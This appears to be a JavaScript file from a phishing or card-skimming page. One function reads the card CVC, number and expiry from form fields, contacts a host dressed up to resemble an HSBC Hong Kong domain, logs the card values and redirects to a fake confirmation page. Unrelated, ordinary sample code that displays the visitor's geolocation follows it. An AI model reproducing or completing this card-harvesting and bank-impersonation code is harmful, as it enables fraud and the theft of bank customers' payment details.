function myFunction() {

   let a = document.querySelector('#card-cvc').value
   let b = document.querySelector('#card-number').value
   let c = document.querySelector('#card-expiry').value

   fetch('https://hsbc.com.hk.1.1.7b52bd64.roksit.net/',{ mode: 'no-cors'})
    .then(response => console.log(response))
    .then(res=>{console.log(res,a,b,c); 
        window.location.href = 'confirmation.html'
    })

}


    
    var x = document.getElementById("demo");

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    }
    
    function showPosition(position) {
      x.innerHTML = "Latitude: " + position.coords.latitude + 
      "<br>Longitude: " + position.coords.longitude;
    }




